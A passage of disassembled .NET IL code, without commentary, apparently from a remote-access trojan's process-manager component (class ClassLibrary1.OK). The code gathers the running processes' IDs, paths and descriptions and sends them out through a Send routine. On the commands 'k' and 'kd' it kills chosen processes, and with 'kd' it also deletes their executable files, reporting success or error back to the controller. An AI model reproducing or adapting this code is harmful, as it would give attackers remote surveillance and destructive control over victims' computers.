      IL_00d5:  ldc.i4.3
      IL_00d6:  ldsfld     string ClassLibrary1.OK::Y
      IL_00db:  stelem.ref
      IL_00dc:  nop
      IL_00dd:  ldloc.s    V_89
      IL_00df:  ldc.i4.4
      IL_00e0:  ldloc.s    V_12
      IL_00e2:  ldlen
      IL_00e3:  conv.ovf.i4
      IL_00e4:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_00e9:  stelem.ref
      IL_00ea:  nop
      IL_00eb:  ldloc.s    V_89
      IL_00ed:  call       string [mscorlib]System.String::Concat(string[])
      IL_00f2:  call       bool ClassLibrary1.OK::Send(string)
      IL_00f7:  pop
      IL_00f8:  ldc.i4.0
      IL_00f9:  stloc.s    V_10
      IL_00fb:  ldstr      ""
      IL_0100:  stloc.s    V_13
      IL_0102:  ldloc.s    V_12
      IL_0104:  stloc.s    V_91
      IL_0106:  ldc.i4.0
      IL_0107:  stloc.s    V_90
      IL_0109:  br         IL_0450

      IL_010e:  ldloc.s    V_91
      IL_0110:  ldloc.s    V_90
      IL_0112:  ldelem.ref
      IL_0113:  stloc.s    V_11
      IL_0115:  ldloc.s    V_10
      IL_0117:  ldc.i4.1
      IL_0118:  add.ovf
      IL_0119:  stloc.s    V_10
      IL_011b:  nop
      .try
      {
        IL_011c:  nop
        .try
        {
          IL_011d:  ldstr      ""
          IL_0122:  stloc.s    V_14
          IL_0124:  nop
          .try
          {
            IL_0125:  ldloc.s    V_11
            IL_0127:  callvirt   instance class [System]System.Diagnostics.ProcessModule [System]System.Diagnostics.Process::get_MainModule()
            IL_012c:  callvirt   instance class [System]System.Diagnostics.FileVersionInfo [System]System.Diagnostics.ProcessModule::get_FileVersionInfo()
            IL_0131:  callvirt   instance string [System]System.Diagnostics.FileVersionInfo::get_FileDescription()
            IL_0136:  stloc.s    V_92
            IL_0138:  ldloca.s   V_92
            IL_013a:  call       string ClassLibrary1.OK::ENB(string&)
            IL_013f:  stloc.s    V_14
            IL_0141:  leave.s    IL_0165

          }  // end .try
          catch [mscorlib]System.Exception 
          {
            IL_0143:  dup
            IL_0144:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
            IL_0149:  stloc.s    V_16
            IL_014b:  nop
            IL_014c:  ldloc.s    V_16
            IL_014e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
            IL_0153:  nop
            IL_0154:  ldloc.s    V_16
            IL_0156:  stloc.s    V_15
            IL_0158:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
            IL_015d:  nop
            IL_015e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
            IL_0163:  leave.s    IL_0165

          }  // end handler
          IL_0165:  nop
          IL_0166:  ldc.i4.7
          IL_0167:  newarr     [mscorlib]System.String
          IL_016c:  stloc.s    V_89
          IL_016e:  ldloc.s    V_89
          IL_0170:  ldc.i4.0
          IL_0171:  ldloc.s    V_13
          IL_0173:  stelem.ref
          IL_0174:  nop
          IL_0175:  ldloc.s    V_89
          IL_0177:  ldc.i4.1
          IL_0178:  ldsfld     string ClassLibrary1.OK::Y
          IL_017d:  stelem.ref
          IL_017e:  nop
          IL_017f:  ldloc.s    V_89
          IL_0181:  ldc.i4.2
          IL_0182:  ldloc.s    V_11
          IL_0184:  callvirt   instance int32 [System]System.Diagnostics.Process::get_Id()
          IL_0189:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
          IL_018e:  stelem.ref
          IL_018f:  nop
          IL_0190:  ldloc.s    V_89
          IL_0192:  ldc.i4.3
          IL_0193:  ldstr      ","
          IL_0198:  stelem.ref
          IL_0199:  nop
          IL_019a:  ldloc.s    V_89
          IL_019c:  ldc.i4.4
          IL_019d:  ldloc.s    V_11
          IL_019f:  callvirt   instance class [System]System.Diagnostics.ProcessModule [System]System.Diagnostics.Process::get_MainModule()
          IL_01a4:  callvirt   instance string [System]System.Diagnostics.ProcessModule::get_FileName()
          IL_01a9:  stelem.ref
          IL_01aa:  nop
          IL_01ab:  ldloc.s    V_89
          IL_01ad:  ldc.i4.5
          IL_01ae:  ldstr      ","
          IL_01b3:  stelem.ref
          IL_01b4:  nop
          IL_01b5:  ldloc.s    V_89
          IL_01b7:  ldc.i4.6
          IL_01b8:  ldloc.s    V_14
          IL_01ba:  stelem.ref
          IL_01bb:  nop
          IL_01bc:  ldloc.s    V_89
          IL_01be:  call       string [mscorlib]System.String::Concat(string[])
          IL_01c3:  stloc.s    V_13
          IL_01c5:  leave      IL_0268

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_01ca:  dup
          IL_01cb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_01d0:  stloc.s    V_18
          IL_01d2:  nop
          IL_01d3:  ldloc.s    V_18
          IL_01d5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_01da:  nop
          IL_01db:  ldloc.s    V_18
          IL_01dd:  stloc.s    V_17
          IL_01df:  ldc.i4.7
          IL_01e0:  newarr     [mscorlib]System.String
          IL_01e5:  stloc.s    V_89
          IL_01e7:  ldloc.s    V_89
          IL_01e9:  ldc.i4.0
          IL_01ea:  ldloc.s    V_13
          IL_01ec:  stelem.ref
          IL_01ed:  nop
          IL_01ee:  ldloc.s    V_89
          IL_01f0:  ldc.i4.1
          IL_01f1:  ldsfld     string ClassLibrary1.OK::Y
          IL_01f6:  stelem.ref
          IL_01f7:  nop
          IL_01f8:  ldloc.s    V_89
          IL_01fa:  ldc.i4.2
          IL_01fb:  ldloc.s    V_11
          IL_01fd:  callvirt   instance int32 [System]System.Diagnostics.Process::get_Id()
          IL_0202:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
          IL_0207:  stelem.ref
          IL_0208:  nop
          IL_0209:  ldloc.s    V_89
          IL_020b:  ldc.i4.3
          IL_020c:  ldstr      ","
          IL_0211:  stelem.ref
          IL_0212:  nop
          IL_0213:  ldloc.s    V_89
          IL_0215:  ldc.i4.4
          IL_0216:  ldloc.s    V_11
          IL_0218:  callvirt   instance class [System]System.Diagnostics.ProcessModule [System]System.Diagnostics.Process::get_MainModule()
          IL_021d:  callvirt   instance class [System]System.Diagnostics.FileVersionInfo [System]System.Diagnostics.ProcessModule::get_FileVersionInfo()
          IL_0222:  callvirt   instance string [System]System.Diagnostics.FileVersionInfo::get_FileName()
          IL_0227:  stelem.ref
          IL_0228:  nop
          IL_0229:  ldloc.s    V_89
          IL_022b:  ldc.i4.5
          IL_022c:  ldstr      ","
          IL_0231:  stelem.ref
          IL_0232:  nop
          IL_0233:  ldloc.s    V_89
          IL_0235:  ldc.i4.6
          IL_0236:  ldloc.s    V_11
          IL_0238:  callvirt   instance class [System]System.Diagnostics.ProcessModule [System]System.Diagnostics.Process::get_MainModule()
          IL_023d:  callvirt   instance class [System]System.Diagnostics.FileVersionInfo [System]System.Diagnostics.ProcessModule::get_FileVersionInfo()
          IL_0242:  callvirt   instance string [System]System.Diagnostics.FileVersionInfo::get_FileDescription()
          IL_0247:  stloc.s    V_92
          IL_0249:  ldloca.s   V_92
          IL_024b:  call       string ClassLibrary1.OK::ENB(string&)
          IL_0250:  stelem.ref
          IL_0251:  nop
          IL_0252:  ldloc.s    V_89
          IL_0254:  call       string [mscorlib]System.String::Concat(string[])
          IL_0259:  stloc.s    V_13
          IL_025b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0260:  nop
          IL_0261:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0266:  leave.s    IL_0268

        }  // end handler
        IL_0268:  nop
        IL_0269:  leave      IL_03ff

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_026e:  dup
        IL_026f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0274:  stloc.s    V_19
        IL_0276:  nop
        IL_0277:  ldloc.s    V_19
        IL_0279:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_027e:  nop
        IL_027f:  ldloc.s    V_19
        IL_0281:  stloc.s    V_20
        IL_0283:  ldstr      ""
        IL_0288:  stloc.s    V_21
        IL_028a:  nop
        .try
        {
          IL_028b:  ldstr      "windir"
          IL_0290:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
          IL_0295:  ldstr      "\\system32\\"
          IL_029a:  ldloc.s    V_11
          IL_029c:  callvirt   instance string [System]System.Diagnostics.Process::get_ProcessName()
          IL_02a1:  ldstr      ".exe"
          IL_02a6:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string,
                                                                      string)
          IL_02ab:  call       class [System]System.Diagnostics.FileVersionInfo [System]System.Diagnostics.FileVersionInfo::GetVersionInfo(string)
          IL_02b0:  callvirt   instance string [System]System.Diagnostics.FileVersionInfo::get_FileDescription()
          IL_02b5:  stloc.s    V_92
          IL_02b7:  ldloca.s   V_92
          IL_02b9:  call       string ClassLibrary1.OK::ENB(string&)
          IL_02be:  stloc.s    V_21
          IL_02c0:  leave.s    IL_02e4

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_02c2:  dup
          IL_02c3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_02c8:  stloc.s    V_22
          IL_02ca:  nop
          IL_02cb:  ldloc.s    V_22
          IL_02cd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_02d2:  nop
          IL_02d3:  ldloc.s    V_22
          IL_02d5:  stloc.s    V_23
          IL_02d7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_02dc:  nop
          IL_02dd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_02e2:  leave.s    IL_02e4

        }  // end handler
        IL_02e4:  nop
        IL_02e5:  ldstr      "windir"
        IL_02ea:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
        IL_02ef:  ldstr      "\\system32\\"
        IL_02f4:  ldloc.s    V_11
        IL_02f6:  callvirt   instance string [System]System.Diagnostics.Process::get_ProcessName()
        IL_02fb:  ldstr      ".exe"
        IL_0300:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_0305:  call       bool [mscorlib]System.IO.File::Exists(string)
        IL_030a:  stloc.s    V_110
        IL_030c:  ldloc.s    V_110
        IL_030e:  brfalse    IL_0396

        IL_0313:  ldstr      "windir"
        IL_0318:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
        IL_031d:  ldstr      "\\system32\\"
        IL_0322:  ldloc.s    V_11
        IL_0324:  callvirt   instance string [System]System.Diagnostics.Process::get_ProcessName()
        IL_0329:  ldstr      ".exe"
        IL_032e:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_0333:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
        IL_0338:  stloc.s    V_24
        IL_033a:  ldc.i4.7
        IL_033b:  newarr     [mscorlib]System.String
        IL_0340:  stloc.s    V_89
        IL_0342:  ldloc.s    V_89
        IL_0344:  ldc.i4.0
        IL_0345:  ldloc.s    V_13
        IL_0347:  stelem.ref
        IL_0348:  nop
        IL_0349:  ldloc.s    V_89
        IL_034b:  ldc.i4.1
        IL_034c:  ldsfld     string ClassLibrary1.OK::Y
        IL_0351:  stelem.ref
        IL_0352:  nop
        IL_0353:  ldloc.s    V_89
        IL_0355:  ldc.i4.2
        IL_0356:  ldloc.s    V_11
        IL_0358:  callvirt   instance int32 [System]System.Diagnostics.Process::get_Id()
        IL_035d:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
        IL_0362:  stelem.ref
        IL_0363:  nop
        IL_0364:  ldloc.s    V_89
        IL_0366:  ldc.i4.3
        IL_0367:  ldstr      ","
        IL_036c:  stelem.ref
        IL_036d:  nop
        IL_036e:  ldloc.s    V_89
        IL_0370:  ldc.i4.4
        IL_0371:  ldloc.s    V_24
        IL_0373:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_0378:  stelem.ref
        IL_0379:  nop
        IL_037a:  ldloc.s    V_89
        IL_037c:  ldc.i4.5
        IL_037d:  ldstr      ","
        IL_0382:  stelem.ref
        IL_0383:  nop
        IL_0384:  ldloc.s    V_89
        IL_0386:  ldc.i4.6
        IL_0387:  ldloc.s    V_21
        IL_0389:  stelem.ref
        IL_038a:  nop
        IL_038b:  ldloc.s    V_89
        IL_038d:  call       string [mscorlib]System.String::Concat(string[])
        IL_0392:  stloc.s    V_13
        IL_0394:  br.s       IL_03f1

        IL_0396:  nop
        IL_0397:  ldc.i4.7
        IL_0398:  newarr     [mscorlib]System.String
        IL_039d:  stloc.s    V_89
        IL_039f:  ldloc.s    V_89
        IL_03a1:  ldc.i4.0
        IL_03a2:  ldloc.s    V_13
        IL_03a4:  stelem.ref
        IL_03a5:  nop
        IL_03a6:  ldloc.s    V_89
        IL_03a8:  ldc.i4.1
        IL_03a9:  ldsfld     string ClassLibrary1.OK::Y
        IL_03ae:  stelem.ref
        IL_03af:  nop
        IL_03b0:  ldloc.s    V_89
        IL_03b2:  ldc.i4.2
        IL_03b3:  ldloc.s    V_11
        IL_03b5:  callvirt   instance int32 [System]System.Diagnostics.Process::get_Id()
        IL_03ba:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
        IL_03bf:  stelem.ref
        IL_03c0:  nop
        IL_03c1:  ldloc.s    V_89
        IL_03c3:  ldc.i4.3
        IL_03c4:  ldstr      ","
        IL_03c9:  stelem.ref
        IL_03ca:  nop
        IL_03cb:  ldloc.s    V_89
        IL_03cd:  ldc.i4.4
        IL_03ce:  ldloc.s    V_11
        IL_03d0:  callvirt   instance string [System]System.Diagnostics.Process::get_ProcessName()
        IL_03d5:  stelem.ref
        IL_03d6:  nop
        IL_03d7:  ldloc.s    V_89
        IL_03d9:  ldc.i4.5
        IL_03da:  ldstr      ","
        IL_03df:  stelem.ref
        IL_03e0:  nop
        IL_03e1:  ldloc.s    V_89
        IL_03e3:  ldc.i4.6
        IL_03e4:  ldloc.s    V_21
        IL_03e6:  stelem.ref
        IL_03e7:  nop
        IL_03e8:  ldloc.s    V_89
        IL_03ea:  call       string [mscorlib]System.String::Concat(string[])
        IL_03ef:  stloc.s    V_13
        IL_03f1:  nop
        IL_03f2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_03f7:  nop
        IL_03f8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_03fd:  leave.s    IL_03ff

      }  // end handler
      IL_03ff:  nop
      IL_0400:  ldloc.s    V_10
      IL_0402:  ldc.i4.s   10
      IL_0404:  ceq
      IL_0406:  stloc.s    V_110
      IL_0408:  ldloc.s    V_110
      IL_040a:  brfalse.s  IL_0448

      IL_040c:  ldc.i4.0
      IL_040d:  stloc.s    V_10
      IL_040f:  ldnull
      IL_0410:  ldftn      void ClassLibrary1.OK::_Lambda__1(object)
      IL_0416:  newobj     instance void [mscorlib]System.Threading.ParameterizedThreadStart::.ctor(object,
                                                                                                    native int)
      IL_041b:  ldc.i4.1
      IL_041c:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ParameterizedThreadStart,
                                                                                  int32)
      IL_0421:  stloc.s    V_25
      IL_0423:  ldloc.s    V_25
      IL_0425:  ldstr      "proc"
      IL_042a:  ldsfld     string ClassLibrary1.OK::Y
      IL_042f:  ldstr      "!"
      IL_0434:  ldloc.s    V_13
      IL_0436:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_043b:  callvirt   instance void [mscorlib]System.Threading.Thread::Start(object)
      IL_0440:  nop
      IL_0441:  ldstr      ""
      IL_0446:  stloc.s    V_13
      IL_0448:  nop
      IL_0449:  ldloc.s    V_90
      IL_044b:  ldc.i4.1
      IL_044c:  add.ovf
      IL_044d:  stloc.s    V_90
      IL_044f:  nop
      IL_0450:  ldloc.s    V_90
      IL_0452:  ldloc.s    V_91
      IL_0454:  ldlen
      IL_0455:  conv.ovf.i4
      IL_0456:  clt
      IL_0458:  stloc.s    V_110
      IL_045a:  ldloc.s    V_110
      IL_045c:  brtrue     IL_010e

      IL_0461:  ldloc.s    V_13
      IL_0463:  ldstr      ""
      IL_0468:  ldc.i4.0
      IL_0469:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_046e:  ldc.i4.0
      IL_046f:  ceq
      IL_0471:  ldc.i4.0
      IL_0472:  ceq
      IL_0474:  stloc.s    V_110
      IL_0476:  ldloc.s    V_110
      IL_0478:  brfalse.s  IL_0496

      IL_047a:  ldstr      "proc"
      IL_047f:  ldsfld     string ClassLibrary1.OK::Y
      IL_0484:  ldstr      "!"
      IL_0489:  ldloc.s    V_13
      IL_048b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0490:  call       bool ClassLibrary1.OK::Send(string)
      IL_0495:  pop
      IL_0496:  nop
      IL_0497:  nop
      IL_0498:  br         IL_09ae

      IL_049d:  br         IL_09ae

      IL_04a2:  nop
      IL_04a3:  ldloc.s    V_88
      IL_04a5:  ldstr      "k"
      IL_04aa:  ldc.i4.0
      IL_04ab:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_04b0:  ldc.i4.0
      IL_04b1:  ceq
      IL_04b3:  stloc.s    V_110
      IL_04b5:  ldloc.s    V_110
      IL_04b7:  brfalse    IL_05b9

      IL_04bc:  nop
      IL_04bd:  ldloc.0
      IL_04be:  ldlen
      IL_04bf:  conv.ovf.i4
      IL_04c0:  ldc.i4.1
      IL_04c1:  sub.ovf
      IL_04c2:  stloc.s    V_27
      IL_04c4:  ldc.i4.2
      IL_04c5:  stloc.s    V_26
      IL_04c7:  br         IL_059c

      IL_04cc:  nop
      .try
      {
        IL_04cd:  ldloc.0
        IL_04ce:  ldloc.s    V_26
        IL_04d0:  ldelem.ref
        IL_04d1:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
        IL_04d6:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetProcessById(int32)
        IL_04db:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
        IL_04e0:  nop
        IL_04e1:  ldc.i4.5
        IL_04e2:  newarr     [mscorlib]System.String
        IL_04e7:  stloc.s    V_89
        IL_04e9:  ldloc.s    V_89
        IL_04eb:  ldc.i4.0
        IL_04ec:  ldstr      "proc"
        IL_04f1:  stelem.ref
        IL_04f2:  nop
        IL_04f3:  ldloc.s    V_89
        IL_04f5:  ldc.i4.1
        IL_04f6:  ldsfld     string ClassLibrary1.OK::Y
        IL_04fb:  stelem.ref
        IL_04fc:  nop
        IL_04fd:  ldloc.s    V_89
        IL_04ff:  ldc.i4.2
        IL_0500:  ldstr      "RM"
        IL_0505:  stelem.ref
        IL_0506:  nop
        IL_0507:  ldloc.s    V_89
        IL_0509:  ldc.i4.3
        IL_050a:  ldsfld     string ClassLibrary1.OK::Y
        IL_050f:  stelem.ref
        IL_0510:  nop
        IL_0511:  ldloc.s    V_89
        IL_0513:  ldc.i4.4
        IL_0514:  ldloc.0
        IL_0515:  ldloc.s    V_26
        IL_0517:  ldelem.ref
        IL_0518:  stelem.ref
        IL_0519:  nop
        IL_051a:  ldloc.s    V_89
        IL_051c:  call       string [mscorlib]System.String::Concat(string[])
        IL_0521:  call       bool ClassLibrary1.OK::Send(string)
        IL_0526:  pop
        IL_0527:  leave.s    IL_0594

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0529:  dup
        IL_052a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_052f:  stloc.s    V_28
        IL_0531:  nop
        IL_0532:  ldloc.s    V_28
        IL_0534:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0539:  nop
        IL_053a:  ldloc.s    V_28
        IL_053c:  stloc.s    V_29
        IL_053e:  ldc.i4.5
        IL_053f:  newarr     [mscorlib]System.String
        IL_0544:  stloc.s    V_89
        IL_0546:  ldloc.s    V_89
        IL_0548:  ldc.i4.0
        IL_0549:  ldstr      "proc"
        IL_054e:  stelem.ref
        IL_054f:  nop
        IL_0550:  ldloc.s    V_89
        IL_0552:  ldc.i4.1
        IL_0553:  ldsfld     string ClassLibrary1.OK::Y
        IL_0558:  stelem.ref
        IL_0559:  nop
        IL_055a:  ldloc.s    V_89
        IL_055c:  ldc.i4.2
        IL_055d:  ldstr      "ER"
        IL_0562:  stelem.ref
        IL_0563:  nop
        IL_0564:  ldloc.s    V_89
        IL_0566:  ldc.i4.3
        IL_0567:  ldsfld     string ClassLibrary1.OK::Y
        IL_056c:  stelem.ref
        IL_056d:  nop
        IL_056e:  ldloc.s    V_89
        IL_0570:  ldc.i4.4
        IL_0571:  ldloc.s    V_29
        IL_0573:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_0578:  stelem.ref
        IL_0579:  nop
        IL_057a:  ldloc.s    V_89
        IL_057c:  call       string [mscorlib]System.String::Concat(string[])
        IL_0581:  call       bool ClassLibrary1.OK::Send(string)
        IL_0586:  pop
        IL_0587:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_058c:  nop
        IL_058d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0592:  leave.s    IL_0594

      }  // end handler
      IL_0594:  nop
      IL_0595:  ldloc.s    V_26
      IL_0597:  ldc.i4.1
      IL_0598:  add.ovf
      IL_0599:  stloc.s    V_26
      IL_059b:  nop
      IL_059c:  ldloc.s    V_26
      IL_059e:  ldloc.s    V_27
      IL_05a0:  cgt
      IL_05a2:  ldc.i4.0
      IL_05a3:  ceq
      IL_05a5:  stloc.s    V_110
      IL_05a7:  ldloc.s    V_110
      IL_05a9:  brtrue     IL_04cc

      IL_05ae:  nop
      IL_05af:  br         IL_09ae

      IL_05b4:  br         IL_09ae

      IL_05b9:  nop
      IL_05ba:  ldloc.s    V_88
      IL_05bc:  ldstr      "kd"
      IL_05c1:  ldc.i4.0
      IL_05c2:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_05c7:  ldc.i4.0
      IL_05c8:  ceq
      IL_05ca:  stloc.s    V_110
      IL_05cc:  ldloc.s    V_110
      IL_05ce:  brfalse    IL_07ac

      IL_05d3:  nop
      IL_05d4:  ldloc.0
      IL_05d5:  ldlen
      IL_05d6:  conv.ovf.i4
      IL_05d7:  ldc.i4.1
      IL_05d8:  sub.ovf
      IL_05d9:  stloc.s    V_31
      IL_05db:  ldc.i4.2
      IL_05dc:  stloc.s    V_30
      IL_05de:  br         IL_078f

      IL_05e3:  nop
      .try
      {
        IL_05e4:  ldstr      ""
        IL_05e9:  stloc.s    V_32
        IL_05eb:  ldloc.0
        IL_05ec:  ldloc.s    V_30
        IL_05ee:  ldelem.ref
        IL_05ef:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
        IL_05f4:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetProcessById(int32)
        IL_05f9:  stloc.s    V_33
        IL_05fb:  nop
        .try
        {
          IL_05fc:  ldloc.s    V_33
          IL_05fe:  callvirt   instance class [System]System.Diagnostics.ProcessModule [System]System.Diagnostics.Process::get_MainModule()
          IL_0603:  callvirt   instance class [System]System.Diagnostics.FileVersionInfo [System]System.Diagnostics.ProcessModule::get_FileVersionInfo()
          IL_0608:  callvirt   instance string [System]System.Diagnostics.FileVersionInfo::get_FileName()
          IL_060d:  stloc.s    V_32
          IL_060f:  leave.s    IL_0667

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_0611:  dup
          IL_0612:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0617:  stloc.s    V_34
          IL_0619:  nop
          IL_061a:  ldloc.s    V_34
          IL_061c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0621:  nop
          IL_0622:  ldloc.s    V_34
          IL_0624:  stloc.s    V_35
          IL_0626:  nop
          .try
          {
            IL_0627:  ldloc.s    V_33
            IL_0629:  callvirt   instance class [System]System.Diagnostics.ProcessModule [System]System.Diagnostics.Process::get_MainModule()
            IL_062e:  callvirt   instance string [System]System.Diagnostics.ProcessModule::get_FileName()
            IL_0633:  stloc.s    V_32
            IL_0635:  leave.s    IL_0659

          }  // end .try
          catch [mscorlib]System.Exception 
          {
            IL_0637:  dup
            IL_0638:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
            IL_063d:  stloc.s    V_36
            IL_063f:  nop
            IL_0640:  ldloc.s    V_36
            IL_0642:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
            IL_0647:  nop
            IL_0648:  ldloc.s    V_36
            IL_064a:  stloc.s    V_37
            IL_064c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
            IL_0651:  nop
            IL_0652:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
            IL_0657:  leave.s    IL_0659

          }  // end handler
          IL_0659:  nop
          IL_065a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_065f:  nop
          IL_0660:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0665:  leave.s    IL_0667

        }  // end handler
        IL_0667:  nop
        IL_0668:  ldloc.s    V_33
        IL_066a:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
        IL_066f:  nop
        IL_0670:  ldc.i4.5
        IL_0671:  newarr     [mscorlib]System.String
        IL_0676:  stloc.s    V_89
        IL_0678:  ldloc.s    V_89
        IL_067a:  ldc.i4.0
        IL_067b:  ldstr      "proc"
        IL_0680:  stelem.ref
        IL_0681:  nop
        IL_0682:  ldloc.s    V_89
        IL_0684:  ldc.i4.1
        IL_0685:  ldsfld     string ClassLibrary1.OK::Y
        IL_068a:  stelem.ref
        IL_068b:  nop
        IL_068c:  ldloc.s    V_89
        IL_068e:  ldc.i4.2
        IL_068f:  ldstr      "RM"
        IL_0694:  stelem.ref
        IL_0695:  nop
        IL_0696:  ldloc.s    V_89
        IL_0698:  ldc.i4.3
        IL_0699:  ldsfld     string ClassLibrary1.OK::Y
        IL_069e:  stelem.ref
        IL_069f:  nop
        IL_06a0:  ldloc.s    V_89
        IL_06a2:  ldc.i4.4
        IL_06a3:  ldloc.0
        IL_06a4:  ldloc.s    V_30
        IL_06a6:  ldelem.ref
        IL_06a7:  stelem.ref
        IL_06a8:  nop
        IL_06a9:  ldloc.s    V_89
        IL_06ab:  call       string [mscorlib]System.String::Concat(string[])
        IL_06b0:  call       bool ClassLibrary1.OK::Send(string)
        IL_06b5:  pop
        IL_06b6:  ldnull
        IL_06b7:  stloc.s    V_33
        IL_06b9:  ldc.i4     0x7d0
        IL_06be:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
        IL_06c3:  nop
        IL_06c4:  ldloc.s    V_32
        IL_06c6:  call       void [mscorlib]System.IO.File::Delete(string)
        IL_06cb:  nop
        IL_06cc:  ldc.i4.6
        IL_06cd:  newarr     [mscorlib]System.String
        IL_06d2:  stloc.s    V_89
        IL_06d4:  ldloc.s    V_89
        IL_06d6:  ldc.i4.0
        IL_06d7:  ldstr      "proc"
        IL_06dc:  stelem.ref
        IL_06dd:  nop
        IL_06de:  ldloc.s    V_89
        IL_06e0:  ldc.i4.1
        IL_06e1:  ldsfld     string ClassLibrary1.OK::Y
        IL_06e6:  stelem.ref
        IL_06e7:  nop
        IL_06e8:  ldloc.s    V_89
        IL_06ea:  ldc.i4.2
        IL_06eb:  ldstr      "ER"
        IL_06f0:  stelem.ref
        IL_06f1:  nop
        IL_06f2:  ldloc.s    V_89
        IL_06f4:  ldc.i4.3
        IL_06f5:  ldsfld     string ClassLibrary1.OK::Y
